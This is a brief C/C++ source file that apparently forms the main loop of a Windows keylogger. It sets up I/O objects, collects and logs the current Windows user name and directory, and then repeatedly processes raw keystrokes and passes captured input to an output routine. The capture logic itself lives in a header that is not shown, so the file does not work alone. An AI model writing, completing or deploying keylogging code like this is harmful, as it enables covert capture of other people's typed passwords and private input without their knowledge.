#include "s_header.h"

cIOBuffer mks_IOBuffer;
cIOSystem mks_IOSystem;

SKEY k_Keylist[_MKSS_KEYS];

void __CC 
vSetup()
{
	mks_IOBuffer.vSetupBuffer();
	mks_IOSystem.vSetupBuffer();

	mks_IOBuffer.vLoadHandle();
	mks_IOBuffer.vGetWinUser();
	mks_IOBuffer.vGetWinDir();


	LOG((LPSTR)mks_IOBuffer.c_LUser);
	LOG((LPSTR)mks_IOBuffer.c_LDir);
}
char __CC
vLoop()
{
	mks_IOSystem.vProcessRawKey();
	mks_IOSystem.vProcessKey();
	return 1;
}
int __CC
vCleanup()
{
	return 1;
}
char __CC
vCatchloop()
{
	mks_IOBuffer.vProcessOutput(mks_IOSystem.dw_Msg);
	mks_IOBuffer.vRequestInput(&mks_IOSystem.c_RawKey);
	return 1;
}